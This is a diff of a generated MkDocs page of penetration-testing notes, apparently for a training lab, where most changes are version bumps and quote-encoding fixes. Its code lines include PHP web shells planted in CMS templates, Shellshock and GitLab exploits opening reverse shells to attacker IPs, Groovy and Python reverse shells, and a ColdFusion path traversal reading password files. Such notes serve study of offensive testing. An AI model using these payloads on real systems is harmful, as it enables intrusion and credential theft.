@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -4200,9 +4200,9 @@
 <span class="normal"> 9</span>
 <span class="normal">10</span>
 <span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1">curl<span class="w"> </span>https://pyenv.run<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
-</span><span id="__span-17-2"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
-</span><span id="__span-17-3"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
-</span><span id="__span-17-4"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;eval &quot;$(pyenv init -)&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</span><span id="__span-17-2"><span class="nb">echo</span><span class="w"> </span><span class="s1">'export PYENV_ROOT="$HOME/.pyenv"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</span><span id="__span-17-3"><span class="nb">echo</span><span class="w"> </span><span class="s1">'command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</span><span id="__span-17-4"><span class="nb">echo</span><span class="w"> </span><span class="s1">'eval "$(pyenv init -)"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
 </span><span id="__span-17-5"><span class="nb">source</span><span class="w"> </span>~/.bashrc
 </span><span id="__span-17-6">pyenv<span class="w"> </span>install<span class="w"> </span><span class="m">2</span>.7
 </span><span id="__span-17-7">pyenv<span class="w"> </span>shell<span class="w"> </span><span class="m">2</span>.7
@@ -4233,7 +4233,7 @@
 <li>Click on a template name under the Templates column header</li>
 <li>Choose a none standard page, <code>error.php</code> for example.</li>
 <li>Add the web shell after initial comments
-<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><span class="x">system($_GET[&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;]); # randomness added to prevent drive by attack whilst performing pentest</span>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><span class="x">system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); # randomness added to prevent drive by attack whilst performing pentest</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Click <code>Save &amp; Close</code></li>
 <li>Confirm code execution
@@ -4265,7 +4265,7 @@
 </li>
 <li>
 <p>Output first two lines of CHANGELOG.txt to see the version in use (will return 404 on latest versions):
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-acc.inlanefreight.local/CHANGELOG.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-m2<span class="w"> </span><span class="s2">&quot;&quot;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-acc.inlanefreight.local/CHANGELOG.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-m2<span class="w"> </span><span class="s2">""</span>
 </span></code></pre></div></td></tr></table></div></p>
 </li>
 <li>use droopscan:
@@ -4282,14 +4282,14 @@
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><span class="cp">&lt;?php</span>
-</span><span id="__span-24-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;</span><span class="p">]);</span>
+</span><span id="__span-24-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'dcfdd5e021a869fcc6dfaef8bf31377e'</span><span class="p">]);</span>
 </span><span id="__span-24-3"><span class="cp">?&gt;</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Set Text format drop-down to PHP code</li>
 <li>Click Save</li>
 <li>
 <p>Check function of reverse shell
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>uid<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f4<span class="w"> </span>-d<span class="s2">&quot;&gt;&quot;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>uid<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f4<span class="w"> </span>-d<span class="s2">"&gt;"</span>
 </span></code></pre></div></td></tr></table></div></p>
 </li>
 <li>
@@ -4316,7 +4316,7 @@
 <div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><span class="cp">&lt;?php</span>
-</span><span id="__span-28-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fe8edbabc5c5c9b7b764504cd22b17af&#39;</span><span class="p">]);</span>
+</span><span id="__span-28-2"><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'fe8edbabc5c5c9b7b764504cd22b17af'</span><span class="p">]);</span>
 </span><span id="__span-28-3"><span class="cp">?&gt;</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Create a .htaccess file to give ourselves access to the folder
@@ -4356,7 +4356,7 @@
 <li>Allows system-level commands to be maliciously injected</li>
 <li><a href="https://www.exploit-db.com/exploits/44448">PoC</a></li>
 <li>Replace the echo command in the exploit script with a command to write out our malicious PHP script (and references to hello.txt):
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>mrb3n.php
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><span class="nb">echo</span><span class="w"> </span><span class="s2">"PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>mrb3n.php
 </span></code></pre></div></td></tr></table></div></li>
 <li>Run module and fill in relevant details to upload shell
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -4490,9 +4490,9 @@
 <span class="normal">12</span>
 <span class="normal">13</span>
 <span class="normal">14</span>
-<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
 </span><span id="__span-40-2">
-</span><span id="__span-40-3"><span class="cp">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span>
+</span><span id="__span-40-3"><span class="cp">&lt;!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;</span>
 </span><span id="__span-40-4">
 </span><span id="__span-40-5"><span class="nt">&lt;web-app&gt;</span>
 </span><span id="__span-40-6"><span class="w">  </span><span class="nt">&lt;servlet&gt;</span>
@@ -4586,10 +4586,10 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1">curl<span class="w"> </span>-i<span class="w"> </span>http://10.129.204.231/cgi-bin/access.cgi
 </span></code></pre></div></td></tr></table></div></li>
 <li>Test for Shellshock vulnerability
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1">curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd&#39;</span><span class="w"> </span>bash<span class="w"> </span>-s<span class="w"> </span>:<span class="s1">&#39;&#39;</span><span class="w"> </span>http://10.129.205.27/cgi-bin/access.cgi
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1">curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd'</span><span class="w"> </span>bash<span class="w"> </span>-s<span class="w"> </span>:<span class="s1">''</span><span class="w"> </span>http://10.129.205.27/cgi-bin/access.cgi
 </span></code></pre></div></td></tr></table></div></li>
 <li>Set nc listener <code>nc -lvnp 7777</code> and use vulnerability to get a reverse shell:
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1">curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.251/7777 0&gt;&amp;1&#39;</span><span class="w"> </span>http://10.129.205.27/cgi-bin/access.cgi
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1">curl<span class="w"> </span>-H<span class="w"> </span><span class="s1">'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.251/7777 0&gt;&amp;1'</span><span class="w"> </span>http://10.129.205.27/cgi-bin/access.cgi
 </span></code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="jenkins"><a href="https://www.jenkins.io/">Jenkins</a></h2>
@@ -4614,7 +4614,7 @@
 <span class="normal">3</span>
 <span class="normal">4</span>
 <span class="normal">5</span>
-<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><span class="kt">def</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;id&#39;</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><span class="kt">def</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'id'</span>
 </span><span id="__span-52-2"><span class="kt">def</span><span class="w"> </span><span class="n">sout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">(),</span><span class="w"> </span><span class="n">serr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">()</span>
 </span><span id="__span-52-3"><span class="kt">def</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
 </span><span id="__span-52-4"><span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span><span class="w"> </span><span class="n">serr</span><span class="o">)</span>
@@ -4625,7 +4625,7 @@
 <div class="language-groovy highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Groovy</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
-</span><span id="__span-53-2"><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="s2">&quot;-c&quot;</span><span class="o">,</span><span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">String</span><span class="o">[])</span>
+</span><span id="__span-53-2"><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s2">"/bin/bash"</span><span class="o">,</span><span class="s2">"-c"</span><span class="o">,</span><span class="s2">"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">String</span><span class="o">[])</span>
 </span><span id="__span-53-3"><span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Can use metasploit to get reverse shell:
@@ -4686,12 +4686,12 @@
 <span class="normal">7</span>
 <span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-60-1"><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span>
 </span><span id="__span-60-2">
-</span><span id="__span-60-3"><span class="n">ip</span><span class="o">=</span><span class="s2">&quot;10.10.14.15&quot;</span>
-</span><span id="__span-60-4"><span class="n">port</span><span class="o">=</span><span class="s2">&quot;443&quot;</span>
+</span><span id="__span-60-3"><span class="n">ip</span><span class="o">=</span><span class="s2">"10.10.14.15"</span>
+</span><span id="__span-60-4"><span class="n">port</span><span class="o">=</span><span class="s2">"443"</span>
 </span><span id="__span-60-5"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
 </span><span id="__span-60-6"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
 </span><span id="__span-60-7"><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
-</span><span id="__span-60-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+</span><span id="__span-60-8"><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s1">'/bin/bash'</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="prtg-network-monitor">PRTG Network Monitor</h2>
@@ -4702,7 +4702,7 @@
 </span></code></pre></div></td></tr></table></div></li>
 <li>Can show up in Eyewitness scan</li>
 <li>These scans can reveal version number (which can be searched for exploits) or use curl
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-62-1">curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.201.50:8080/index.htm<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>version
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-62-1">curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.201.50:8080/index.htm<span class="w"> </span>-A<span class="w"> </span><span class="s2">"Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>version
 </span></code></pre></div></td></tr></table></div></li>
 <li>Default creds <code>prtgadmin:prtgadmin</code></li>
 <li>Try weak passwords for <code>prtgadmin</code></li>
@@ -4735,7 +4735,7 @@
 <ul>
 <li><a href="https://www.exploit-db.com/exploits/49951">Exploit</a> for GitLab Community Edition version 13.10.2 and lower</li>
 <li>Requires valid username and password (may work with self-registered credentials)
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-63-1">python3<span class="w"> </span>gitlab_13_10_2_rce.py<span class="w"> </span>-t<span class="w"> </span>http://gitlab.inlanefreight.local:8081<span class="w"> </span>-u<span class="w"> </span>Testface<span class="w"> </span>-p<span class="w"> </span>Testface<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f &#39;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-63-1">python3<span class="w"> </span>gitlab_13_10_2_rce.py<span class="w"> </span>-t<span class="w"> </span>http://gitlab.inlanefreight.local:8081<span class="w"> </span>-u<span class="w"> </span>Testface<span class="w"> </span>-p<span class="w"> </span>Testface<span class="w"> </span>-c<span class="w"> </span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.15 8443 &gt;/tmp/f '</span>
 </span></code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="attacking-thick-client-applications">Attacking Thick Client Applications</h2>
@@ -4879,7 +4879,7 @@
 <span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-66-1">searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">14641</span><span class="w"> </span><span class="c1"># copy exploits path to clipboard</span>
 </span><span id="__span-66-2">cp<span class="w"> </span>/usr/share/exploitdb/exploits/multiple/remote/14641.py<span class="w"> </span>.<span class="w"> </span><span class="c1"># copy to current directory</span>
 </span><span id="__span-66-3">python2<span class="w"> </span><span class="m">14641</span>.py<span class="w"> </span><span class="c1"># shows required options</span>
-</span><span id="__span-66-4">python2<span class="w"> </span><span class="m">14641</span>.py<span class="w"> </span><span class="m">10</span>.129.82.113<span class="w"> </span><span class="m">8500</span><span class="w"> </span><span class="s2">&quot;../../../../../../../../ColdFusion8/lib/password.properties&quot;</span><span class="w"> </span><span class="c1"># execute script</span>
+</span><span id="__span-66-4">python2<span class="w"> </span><span class="m">14641</span>.py<span class="w"> </span><span class="m">10</span>.129.82.113<span class="w"> </span><span class="m">8500</span><span class="w"> </span><span class="s2">"../../../../../../../../ColdFusion8/lib/password.properties"</span><span class="w"> </span><span class="c1"># execute script</span>
 </span></code></pre></div></td></tr></table></div></li>
 </ul>
 <h4 id="unauthenticated-rce">Unauthenticated RCE</h4>
@@ -4896,11 +4896,11 @@
 <span class="normal">4</span>
 <span class="normal">5</span>
 <span class="normal">6</span>
-<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-68-1"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-68-1"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
 </span><span id="__span-68-2">    <span class="c1"># Define some information</span>
-</span><span id="__span-68-3">    <span class="n">lhost</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.186&#39;</span> <span class="c1"># HTB VPN IP</span>
+</span><span id="__span-68-3">    <span class="n">lhost</span> <span class="o">=</span> <span class="s1">'10.10.14.186'</span> <span class="c1"># HTB VPN IP</span>
 </span><span id="__span-68-4">    <span class="n">lport</span> <span class="o">=</span> <span class="mi">4444</span> <span class="c1"># A port not in use on localhost</span>
-</span><span id="__span-68-5">    <span class="n">rhost</span> <span class="o">=</span> <span class="s2">&quot;10.129.82.113&quot;</span> <span class="c1"># Target IP</span>
+</span><span id="__span-68-5">    <span class="n">rhost</span> <span class="o">=</span> <span class="s2">"10.129.82.113"</span> <span class="c1"># Target IP</span>
 </span><span id="__span-68-6">    <span class="n">rport</span> <span class="o">=</span> <span class="mi">8500</span> <span class="c1"># Target Port</span>
 </span><span id="__span-68-7">    <span class="n">filename</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
 </span></code></pre></div></td></tr></table></div></li>
@@ -4917,7 +4917,7 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1">java<span class="w"> </span>-jar<span class="w"> </span>iis_shortname_scanner.jar<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="m">5</span><span class="w"> </span>http://10.129.109.78/
 </span></code></pre></div></td></tr></table></div></li>
 <li>Create wordlist of filenames that match the found short name (<code>TRANSF~1.ASP</code>)
-<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1">egrep<span class="w"> </span>-r<span class="w"> </span>^transf<span class="w"> </span>/usr/share/wordlists/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/^[^:]*://&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/list.txt
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1">egrep<span class="w"> </span>-r<span class="w"> </span>^transf<span class="w"> </span>/usr/share/wordlists/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">'s/^[^:]*://'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/list.txt
 </span></code></pre></div></td></tr></table></div></li>
 <li>Enumerate with gobuster
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1">gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.109.78/<span class="w"> </span>-w<span class="w"> </span>/tmp/list.txt<span class="w"> </span>-x<span class="w"> </span>.aspx,.asp
@@ -4975,7 +4975,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
